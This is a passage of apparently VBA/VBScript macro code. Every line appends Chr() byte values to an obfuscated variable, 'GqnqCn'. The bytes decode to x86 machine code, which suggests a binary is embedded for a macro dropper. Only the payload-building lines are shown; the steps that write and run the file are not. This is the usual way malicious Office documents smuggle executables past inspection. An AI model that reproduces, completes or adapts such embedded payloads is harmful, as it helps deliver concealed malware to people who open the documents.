GqnqCn=GqnqCn&Chr(117)&Chr(2)&Chr(136)&Chr(24)&Chr(59)&Chr(251)&Chr(117)&Chr(139)&Chr(131)&Chr(125)&Chr(20)&Chr(255)&Chr(117)&Chr(15)&Chr(139)&Chr(69)&Chr(12)&Chr(106)&Chr(80)&Chr(136)&Chr(92)&Chr(6)&Chr(255)&Chr(88)&Chr(233)&Chr(120)&Chr(255)&Chr(255)&Chr(255)&Chr(136)&Chr(30)&Chr(232)&Chr(222)&Chr(247)&Chr(255)&Chr(255)&Chr(106)&Chr(34)&Chr(89)&Chr(137)&Chr(8)&Chr(139)&Chr(241)&Chr(235)&Chr(130)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(247)&Chr(193)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(36)&Chr(138)&Chr(1)&Chr(131)&Chr(193)&Chr(1)&Chr(132)&Chr(192)&Chr(116)&Chr(78)&Chr(247)&Chr(193)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(239)&Chr(5)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(164)&Chr(36)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(164)&Chr(36)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(1)&Chr(186)&Chr(255)&Chr(254)&Chr(254)&Chr(126)&Chr(3)&Chr(208)&Chr(131)&Chr(240)&Chr(255)&Chr(51)&Chr(194)&Chr(131)&Chr(193)&Chr(4)&Chr(169)&Chr(0)&Chr(1)&Chr(1)&Chr(129)&Chr(116)&Chr(232)&Chr(139)&Chr(65)&Chr(252)&Chr(132)&Chr(192)&Chr(116)&Chr(50)&Chr(132)&Chr(228)&Chr(116)&Chr(36)&Chr(169)&Chr(0)&Chr(0)&Chr(255)&Chr(0)&Chr(116)&Chr(19)&Chr(169)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(116)&Chr(2)&Chr(235)&Chr(205)&Chr(141)&Chr(65)&Chr(255)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(43)&Chr(193)&Chr(195)&Chr(141)&Chr(65)&Chr(254)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(43)&Chr(193)&Chr(195)&Chr(141)&Chr(65)&Chr(253)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(43)&Chr(193)&Chr(195)&Chr(141)&Chr(65)&Chr(252)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(43)&Chr(193)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)
GqnqCn=GqnqCn&Chr(139)&Chr(77)&Chr(8)&Chr(83)&Chr(51)&Chr(219)&Chr(86)&Chr(87)&Chr(59)&Chr(203)&Chr(116)&Chr(7)&Chr(139)&Chr(125)&Chr(12)&Chr(59)&Chr(251)&Chr(119)&Chr(27)&Chr(232)&Chr(34)&Chr(247)&Chr(255)&Chr(255)&Chr(106)&Chr(22)&Chr(94)&Chr(137)&Chr(48)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(232)&Chr(171)&Chr(246)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(139)&Chr(198)&Chr(235)&Chr(48)&Chr(139)&Chr(117)&Chr(16)&Chr(59)&Chr(243)&Chr(117)&Chr(4)&Chr(136)&Chr(25)&Chr(235)&Chr(218)&Chr(139)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(2)&Chr(66)&Chr(70)&Chr(58)&Chr(195)&Chr(116)&Chr(3)&Chr(79)&Chr(117)&Chr(243)&Chr(59)&Chr(251)&Chr(117)&Chr(16)&Chr(136)&Chr(25)&Chr(232)&Chr(231)&Chr(246)&Chr(255)&Chr(255)&Chr(106)&Chr(34)&Chr(89)&Chr(137)&Chr(8)&Chr(139)&Chr(241)&Chr(235)&Chr(193)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(139)
GqnqCn=GqnqCn&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(77)&Chr(8)&Chr(86)&Chr(51)&Chr(246)&Chr(59)&Chr(206)&Chr(124)&Chr(30)&Chr(131)&Chr(249)&Chr(2)&Chr(126)&Chr(12)&Chr(131)&Chr(249)&Chr(3)&Chr(117)&Chr(20)&Chr(161)&Chr(104)&Chr(172)&Chr(64)&Chr(0)&Chr(235)&Chr(40)&Chr(161)&Chr(104)&Chr(172)&Chr(64)&Chr(0)&Chr(137)&Chr(13)&Chr(104)&Chr(172)&Chr(64)&Chr(0)&Chr(235)&Chr(27)&Chr(232)&Chr(165)&Chr(246)&Chr(255)&Chr(255)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(199)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(45)&Chr(246)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(131)&Chr(200)&Chr(255)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(86)&Chr(139)&Chr(241)&Chr(198)&Chr(70)&Chr(12)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(99)&Chr(232)&Chr(75)&Chr(237)&Chr(255)&Chr(255)&Chr(137)&Chr(70)
GqnqCn=GqnqCn&Chr(8)&Chr(139)&Chr(72)&Chr(108)&Chr(137)&Chr(14)&Chr(139)&Chr(72)&Chr(104)&Chr(137)&Chr(78)&Chr(4)&Chr(139)&Chr(14)&Chr(59)&Chr(13)&Chr(232)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(18)&Chr(139)&Chr(13)&Chr(16)&Chr(170)&Chr(64)&Chr(0)&Chr(133)&Chr(72)&Chr(112)&Chr(117)&Chr(7)&Chr(232)&Chr(22)&Chr(15)&Chr(0)&Chr(0)&Chr(137)&Chr(6)&Chr(139)&Chr(70)&Chr(4)&Chr(59)&Chr(5)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(116)&Chr(22)&Chr(139)&Chr(70)&Chr(8)&Chr(139)&Chr(13)&Chr(16)&Chr(170)&Chr(64)&Chr(0)&Chr(133)&Chr(72)&Chr(112)&Chr(117)&Chr(8)&Chr(232)&Chr(184)&Chr(2)&Chr(0)&Chr(0)&Chr(137)&Chr(70)&Chr(4)&Chr(139)&Chr(70)&Chr(8)&Chr(246)&Chr(64)&Chr(112)&Chr(2)&Chr(117)&Chr(20)&Chr(131)&Chr(72)&Chr(112)&Chr(2)&Chr(198)&Chr(70)&Chr(12)&Chr(1)&Chr(235)&Chr(10)&Chr(139)&Chr(8)&Chr(137)&Chr(14)&Chr(139)&Chr(64)&Chr(4)&Chr(137)
GqnqCn=GqnqCn&Chr(70)&Chr(4)&Chr(139)&Chr(198)&Chr(94)&Chr(93)&Chr(194)&Chr(4)&Chr(0)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(255)&Chr(117)&Chr(8)&Chr(141)&Chr(77)&Chr(240)&Chr(232)&Chr(102)&Chr(255)&Chr(255)&Chr(255)&Chr(15)&Chr(182)&Chr(69)&Chr(12)&Chr(139)&Chr(77)&Chr(244)&Chr(138)&Chr(85)&Chr(20)&Chr(132)&Chr(84)&Chr(1)&Chr(29)&Chr(117)&Chr(30)&Chr(131)&Chr(125)&Chr(16)&Chr(0)&Chr(116)&Chr(18)&Chr(139)&Chr(77)&Chr(240)&Chr(139)&Chr(137)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(183)&Chr(4)&Chr(65)&Chr(35)&Chr(69)&Chr(16)&Chr(235)&Chr(2)&Chr(51)&Chr(192)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(51)&Chr(192)&Chr(64)&Chr(128)&Chr(125)&Chr(252)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(77)&Chr(248)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(106)&Chr(4)&Chr(106)
GqnqCn=GqnqCn&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(106)&Chr(0)&Chr(232)&Chr(154)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(16)&Chr(93)&Chr(195)&Chr(45)&Chr(164)&Chr(3)&Chr(0)&Chr(0)&Chr(116)&Chr(34)&Chr(131)&Chr(232)&Chr(4)&Chr(116)&Chr(23)&Chr(131)&Chr(232)&Chr(13)&Chr(116)&Chr(12)&Chr(72)&Chr(116)&Chr(3)&Chr(51)&Chr(192)&Chr(195)&Chr(184)&Chr(4)&Chr(4)&Chr(0)&Chr(0)&Chr(195)&Chr(184)&Chr(18)&Chr(4)&Chr(0)&Chr(0)&Chr(195)&Chr(184)&Chr(4)&Chr(8)&Chr(0)&Chr(0)&Chr(195)&Chr(184)&Chr(17)&Chr(4)&Chr(0)&Chr(0)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(139)&Chr(240)&Chr(104)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(51)&Chr(255)&Chr(141)&Chr(70)&Chr(28)&Chr(87)&Chr(80)&Chr(232)&Chr(234)&Chr(27)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(15)&Chr(183)&Chr(200)&Chr(139)&Chr(193)&Chr(137)&Chr(126)&Chr(4)&Chr(137)&Chr(126)&Chr(8)&Chr(137)
GqnqCn=GqnqCn&Chr(126)&Chr(12)&Chr(193)&Chr(225)&Chr(16)&Chr(11)&Chr(193)&Chr(141)&Chr(126)&Chr(16)&Chr(171)&Chr(171)&Chr(171)&Chr(185)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(141)&Chr(70)&Chr(28)&Chr(43)&Chr(206)&Chr(191)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(138)&Chr(20)&Chr(1)&Chr(136)&Chr(16)&Chr(64)&Chr(79)&Chr(117)&Chr(247)&Chr(141)&Chr(134)&Chr(29)&Chr(1)&Chr(0)&Chr(0)&Chr(190)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(138)&Chr(20)&Chr(8)&Chr(136)&Chr(16)&Chr(64)&Chr(78)&Chr(117)&Chr(247)&Chr(95)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(129)&Chr(236)&Chr(190)&Chr(5)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(83)&Chr(87)&Chr(141)&Chr(133)&Chr(232)&Chr(250)&Chr(255)&Chr(255)&Chr(80)&Chr(255)&Chr(118)&Chr(4)&Chr(255)&Chr(21)&Chr(168)&Chr(128)
GqnqCn=GqnqCn&Chr(64)&Chr(0)&Chr(191)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(251)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(136)&Chr(132)&Chr(5)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(64)&Chr(59)&Chr(199)&Chr(114)&Chr(244)&Chr(138)&Chr(133)&Chr(238)&Chr(250)&Chr(255)&Chr(255)&Chr(198)&Chr(133)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(32)&Chr(132)&Chr(192)&Chr(116)&Chr(46)&Chr(141)&Chr(157)&Chr(239)&Chr(250)&Chr(255)&Chr(255)&Chr(15)&Chr(182)&Chr(200)&Chr(15)&Chr(182)&Chr(3)&Chr(59)&Chr(200)&Chr(119)&Chr(22)&Chr(43)&Chr(193)&Chr(64)&Chr(80)&Chr(141)&Chr(148)&Chr(13)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(106)&Chr(32)&Chr(82)&Chr(232)&Chr(39)&Chr(27)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(67)&Chr(138)&Chr(3)&Chr(67)&Chr(132)&Chr(192)&Chr(117)&Chr(216)&Chr(106)&Chr(0)&Chr(255)&Chr(118)&Chr(12)&Chr(141)&Chr(133)&Chr(252)
GqnqCn=GqnqCn&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(4)&Chr(80)&Chr(87)&Chr(141)&Chr(133)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(80)&Chr(106)&Chr(1)&Chr(106)&Chr(0)&Chr(232)&Chr(230)&Chr(33)&Chr(0)&Chr(0)&Chr(51)&Chr(219)&Chr(83)&Chr(255)&Chr(118)&Chr(4)&Chr(141)&Chr(133)&Chr(252)&Chr(253)&Chr(255)&Chr(255)&Chr(87)&Chr(80)&Chr(87)&Chr(141)&Chr(133)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(80)&Chr(87)&Chr(255)&Chr(118)&Chr(12)&Chr(83)&Chr(232)&Chr(199)&Chr(31)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(68)&Chr(83)&Chr(255)&Chr(118)&Chr(4)&Chr(141)&Chr(133)&Chr(252)&Chr(252)&Chr(255)&Chr(255)&Chr(87)&Chr(80)&Chr(87)&Chr(141)&Chr(133)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(80)&Chr(104)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(255)&Chr(118)&Chr(12)&Chr(83)&Chr(232)&Chr(162)&Chr(31)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(36)&Chr(51)&Chr(192)&Chr(15)&Chr(183)
GqnqCn=GqnqCn&Chr(140)&Chr(69)&Chr(252)&Chr(250)&Chr(255)&Chr(255)&Chr(246)&Chr(193)&Chr(1)&Chr(116)&Chr(14)&Chr(128)&Chr(76)&Chr(6)&Chr(29)&Chr(16)&Chr(138)&Chr(140)&Chr(5)&Chr(252)&Chr(253)&Chr(255)&Chr(255)&Chr(235)&Chr(17)&Chr(246)&Chr(193)&Chr(2)&Chr(116)&Chr(21)&Chr(128)&Chr(76)&Chr(6)&Chr(29)&Chr(32)&Chr(138)&Chr(140)&Chr(5)&Chr(252)&Chr(252)&Chr(255)&Chr(255)&Chr(136)&Chr(140)&Chr(6)&Chr(29)&Chr(1)&Chr(0)&Chr(0)&Chr(235)&Chr(8)&Chr(198)&Chr(132)&Chr(6)&Chr(29)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(59)&Chr(199)&Chr(114)&Chr(190)&Chr(235)&Chr(86)&Chr(141)&Chr(134)&Chr(29)&Chr(1)&Chr(0)&Chr(0)&Chr(199)&Chr(133)&Chr(228)&Chr(250)&Chr(255)&Chr(255)&Chr(159)&Chr(255)&Chr(255)&Chr(255)&Chr(51)&Chr(201)&Chr(41)&Chr(133)&Chr(228)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(149)&Chr(228)&Chr(250)&Chr(255)&Chr(255)&Chr(141)&Chr(132)&Chr(14)&Chr(29)
GqnqCn=GqnqCn&Chr(1)&Chr(0)&Chr(0)&Chr(3)&Chr(208)&Chr(141)&Chr(90)&Chr(32)&Chr(131)&Chr(251)&Chr(25)&Chr(119)&Chr(12)&Chr(128)&Chr(76)&Chr(14)&Chr(29)&Chr(16)&Chr(138)&Chr(209)&Chr(128)&Chr(194)&Chr(32)&Chr(235)&Chr(15)&Chr(131)&Chr(250)&Chr(25)&Chr(119)&Chr(14)&Chr(128)&Chr(76)&Chr(14)&Chr(29)&Chr(32)&Chr(138)&Chr(209)&Chr(128)&Chr(234)&Chr(32)&Chr(136)&Chr(16)&Chr(235)&Chr(3)&Chr(198)&Chr(0)&Chr(0)&Chr(65)&Chr(59)&Chr(207)&Chr(114)&Chr(194)&Chr(139)&Chr(77)&Chr(252)&Chr(95)&Chr(51)&Chr(205)&Chr(91)&Chr(232)&Chr(122)&Chr(23)&Chr(0)&Chr(0)&Chr(201)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(72)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(70)&Chr(237)&Chr(255)&Chr(255)&Chr(232)&Chr(58)&Chr(234)&Chr(255)&Chr(255)&Chr(139)&Chr(248)&Chr(161)&Chr(16)&Chr(170)&Chr(64)&Chr(0)&Chr(133)&Chr(71)&Chr(112)&Chr(116)&Chr(29)&Chr(131)&Chr(127)&Chr(108)&Chr(0)&Chr(116)
GqnqCn=GqnqCn&Chr(23)&Chr(139)&Chr(119)&Chr(104)&Chr(133)&Chr(246)&Chr(117)&Chr(8)&Chr(106)&Chr(32)&Chr(232)&Chr(157)&Chr(217)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(198)&Chr(232)&Chr(94)&Chr(237)&Chr(255)&Chr(255)&Chr(195)&Chr(106)&Chr(13)&Chr(232)&Chr(97)&Chr(241)&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(139)&Chr(119)&Chr(104)&Chr(137)&Chr(117)&Chr(228)&Chr(59)&Chr(53)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(116)&Chr(54)&Chr(133)&Chr(246)&Chr(116)&Chr(26)&Chr(86)&Chr(255)&Chr(21)&Chr(104)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(15)&Chr(129)&Chr(254)&Chr(224)&Chr(163)&Chr(166)&Chr(0)&Chr(116)&Chr(7)&Chr(86)&Chr(232)&Chr(76)&Chr(4)&Chr(0)&Chr(0)&Chr(89)&Chr(161)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(137)&Chr(71)&Chr(104)&Chr(139)&Chr(53)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(137)&Chr(117)&Chr(228)&Chr(86)&Chr(255)&Chr(21)
GqnqCn=GqnqCn&Chr(92)&Chr(128)&Chr(64)&Chr(0)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(5)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(142)&Chr(139)&Chr(117)&Chr(228)&Chr(106)&Chr(13)&Chr(232)&Chr(38)&Chr(240)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(83)&Chr(51)&Chr(219)&Chr(83)&Chr(141)&Chr(77)&Chr(240)&Chr(232)&Chr(48)&Chr(252)&Chr(255)&Chr(255)&Chr(137)&Chr(29)&Chr(116)&Chr(178)&Chr(64)&Chr(0)&Chr(131)&Chr(254)&Chr(254)&Chr(117)&Chr(30)&Chr(199)&Chr(5)&Chr(116)&Chr(178)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(21)&Chr(176)&Chr(128)&Chr(64)&Chr(0)&Chr(56)&Chr(93)&Chr(252)&Chr(116)&Chr(69)&Chr(139)&Chr(77)&Chr(248)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(235)&Chr(60)&Chr(131)&Chr(254)&Chr(253)&Chr(117)&Chr(18)&Chr(199)&Chr(5)&Chr(116)&Chr(178)
GqnqCn=GqnqCn&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(21)&Chr(172)&Chr(128)&Chr(64)&Chr(0)&Chr(235)&Chr(219)&Chr(131)&Chr(254)&Chr(252)&Chr(117)&Chr(18)&Chr(139)&Chr(69)&Chr(240)&Chr(139)&Chr(64)&Chr(4)&Chr(199)&Chr(5)&Chr(116)&Chr(178)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(196)&Chr(56)&Chr(93)&Chr(252)&Chr(116)&Chr(7)&Chr(139)&Chr(69)&Chr(248)&Chr(131)&Chr(96)&Chr(112)&Chr(253)&Chr(139)&Chr(198)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(32)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(83)&Chr(139)&Chr(93)&Chr(12)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(87)&Chr(232)&Chr(100)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(248)&Chr(51)&Chr(246)&Chr(137)&Chr(125)&Chr(8)&Chr(59)&Chr(254)&Chr(117)&Chr(14)&Chr(139)&Chr(195)&Chr(232)
GqnqCn=GqnqCn&Chr(183)&Chr(252)&Chr(255)&Chr(255)&Chr(51)&Chr(192)&Chr(233)&Chr(157)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(117)&Chr(228)&Chr(51)&Chr(192)&Chr(57)&Chr(184)&Chr(16)&Chr(168)&Chr(64)&Chr(0)&Chr(15)&Chr(132)&Chr(145)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(69)&Chr(228)&Chr(131)&Chr(192)&Chr(48)&Chr(61)&Chr(240)&Chr(0)&Chr(0)&Chr(0)&Chr(114)&Chr(231)&Chr(129)&Chr(255)&Chr(232)&Chr(253)&Chr(0)&Chr(0)&Chr(15)&Chr(132)&Chr(112)&Chr(1)&Chr(0)&Chr(0)&Chr(129)&Chr(255)&Chr(233)&Chr(253)&Chr(0)&Chr(0)&Chr(15)&Chr(132)&Chr(100)&Chr(1)&Chr(0)&Chr(0)&Chr(15)&Chr(183)&Chr(199)&Chr(80)&Chr(255)&Chr(21)&Chr(180)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(82)&Chr(1)&Chr(0)&Chr(0)&Chr(141)&Chr(69)&Chr(232)&Chr(80)&Chr(87)&Chr(255)&Chr(21)&Chr(168)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(51)&Chr(1)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(104)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(141)&Chr(67)&Chr(28)&Chr(86)&Chr(80)&Chr(232)&Chr(71)&Chr(24)&Chr(0)&Chr(0)&Chr(51)&Chr(210)&Chr(66)&Chr(131)&Chr(196)&Chr(12)&Chr(137)&Chr(123)&Chr(4)&Chr(137)&Chr(115)&Chr(12)&Chr(57)&Chr(85)&Chr(232)&Chr(15)&Chr(134)&Chr(248)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(125)&Chr(238)&Chr(0)&Chr(15)&Chr(132)&Chr(207)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(117)&Chr(239)&Chr(138)&Chr(14)&Chr(132)&Chr(201)&Chr(15)&Chr(132)&Chr(194)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(182)&Chr(70)&Chr(255)&Chr(15)&Chr(182)&Chr(201)&Chr(233)&Chr(166)&Chr(0)&Chr(0)&Chr(0)&Chr(104)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(141)&Chr(67)&Chr(28)&Chr(86)&Chr(80)&Chr(232)&Chr(0)&Chr(24)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(228)&Chr(131)&Chr(196)&Chr(12)&Chr(107)&Chr(201)&Chr(48)&Chr(137)&Chr(117)&Chr(224)
GqnqCn=GqnqCn&Chr(141)&Chr(177)&Chr(32)&Chr(168)&Chr(64)&Chr(0)&Chr(137)&Chr(117)&Chr(228)&Chr(235)&Chr(42)&Chr(138)&Chr(70)&Chr(1)&Chr(132)&Chr(192)&Chr(116)&Chr(40)&Chr(15)&Chr(182)&Chr(62)&Chr(15)&Chr(182)&Chr(192)&Chr(235)&Chr(18)&Chr(139)&Chr(69)&Chr(224)&Chr(138)&Chr(128)&Chr(12)&Chr(168)&Chr(64)&Chr(0)&Chr(8)&Chr(68)&Chr(59)&Chr(29)&Chr(15)&Chr(182)&Chr(70)&Chr(1)&Chr(71)&Chr(59)&Chr(248)&Chr(118)&Chr(234)&Chr(139)&Chr(125)&Chr(8)&Chr(70)&Chr(70)&Chr(128)&Chr(62)&Chr(0)&Chr(117)&Chr(209)&Chr(139)&Chr(117)&Chr(228)&Chr(255)&Chr(69)&Chr(224)&Chr(131)&Chr(198)&Chr(8)&Chr(131)&Chr(125)&Chr(224)&Chr(4)&Chr(137)&Chr(117)&Chr(228)&Chr(114)&Chr(233)&Chr(139)&Chr(199)&Chr(137)&Chr(123)&Chr(4)&Chr(199)&Chr(67)&Chr(8)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(103)&Chr(251)&Chr(255)&Chr(255)&Chr(106)&Chr(6)&Chr(137)&Chr(67)&Chr(12)&Chr(141)&Chr(67)
GqnqCn=GqnqCn&Chr(16)&Chr(141)&Chr(137)&Chr(20)&Chr(168)&Chr(64)&Chr(0)&Chr(90)&Chr(102)&Chr(139)&Chr(49)&Chr(65)&Chr(102)&Chr(137)&Chr(48)&Chr(65)&Chr(64)&Chr(64)&Chr(74)&Chr(117)&Chr(243)&Chr(139)&Chr(243)&Chr(232)&Chr(215)&Chr(251)&Chr(255)&Chr(255)&Chr(233)&Chr(183)&Chr(254)&Chr(255)&Chr(255)&Chr(128)&Chr(76)&Chr(3)&Chr(29)&Chr(4)&Chr(64)&Chr(59)&Chr(193)&Chr(118)&Chr(246)&Chr(70)&Chr(70)&Chr(128)&Chr(126)&Chr(255)&Chr(0)&Chr(15)&Chr(133)&Chr(52)&Chr(255)&Chr(255)&Chr(255)&Chr(141)&Chr(67)&Chr(30)&Chr(185)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(8)&Chr(8)&Chr(64)&Chr(73)&Chr(117)&Chr(249)&Chr(139)&Chr(67)&Chr(4)&Chr(232)&Chr(18)&Chr(251)&Chr(255)&Chr(255)&Chr(137)&Chr(67)&Chr(12)&Chr(137)&Chr(83)&Chr(8)&Chr(235)&Chr(3)&Chr(137)&Chr(115)&Chr(8)&Chr(51)&Chr(192)&Chr(15)&Chr(183)&Chr(200)&Chr(139)&Chr(193)&Chr(193)&Chr(225)&Chr(16)&Chr(11)
GqnqCn=GqnqCn&Chr(193)&Chr(141)&Chr(123)&Chr(16)&Chr(171)&Chr(171)&Chr(171)&Chr(235)&Chr(168)&Chr(57)&Chr(53)&Chr(116)&Chr(178)&Chr(64)&Chr(0)&Chr(15)&Chr(133)&Chr(88)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(200)&Chr(255)&Chr(139)&Chr(77)&Chr(252)&Chr(95)&Chr(94)&Chr(51)&Chr(205)&Chr(91)&Chr(232)&Chr(117)&Chr(20)&Chr(0)&Chr(0)&Chr(201)&Chr(195)&Chr(106)&Chr(20)&Chr(104)&Chr(104)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(65)&Chr(234)&Chr(255)&Chr(255)&Chr(131)&Chr(77)&Chr(224)&Chr(255)&Chr(232)&Chr(49)&Chr(231)&Chr(255)&Chr(255)&Chr(139)&Chr(248)&Chr(137)&Chr(125)&Chr(220)&Chr(232)&Chr(220)&Chr(252)&Chr(255)&Chr(255)&Chr(139)&Chr(95)&Chr(104)&Chr(139)&Chr(117)&Chr(8)&Chr(232)&Chr(117)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(8)&Chr(59)&Chr(67)&Chr(4)&Chr(15)&Chr(132)&Chr(87)&Chr(1)&Chr(0)&Chr(0)&Chr(104)&Chr(32)&Chr(2)&Chr(0)&Chr(0)&Chr(232)&Chr(6)
GqnqCn=GqnqCn&Chr(2)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(216)&Chr(133)&Chr(219)&Chr(15)&Chr(132)&Chr(70)&Chr(1)&Chr(0)&Chr(0)&Chr(185)&Chr(136)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(119)&Chr(104)&Chr(139)&Chr(251)&Chr(243)&Chr(165)&Chr(131)&Chr(35)&Chr(0)&Chr(83)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(184)&Chr(253)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(137)&Chr(69)&Chr(224)&Chr(133)&Chr(192)&Chr(15)&Chr(133)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(117)&Chr(220)&Chr(255)&Chr(118)&Chr(104)&Chr(255)&Chr(21)&Chr(104)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(17)&Chr(139)&Chr(70)&Chr(104)&Chr(61)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(40)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(94)&Chr(104)&Chr(83)&Chr(139)&Chr(61)&Chr(92)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(215)&Chr(246)&Chr(70)&Chr(112)&Chr(2)
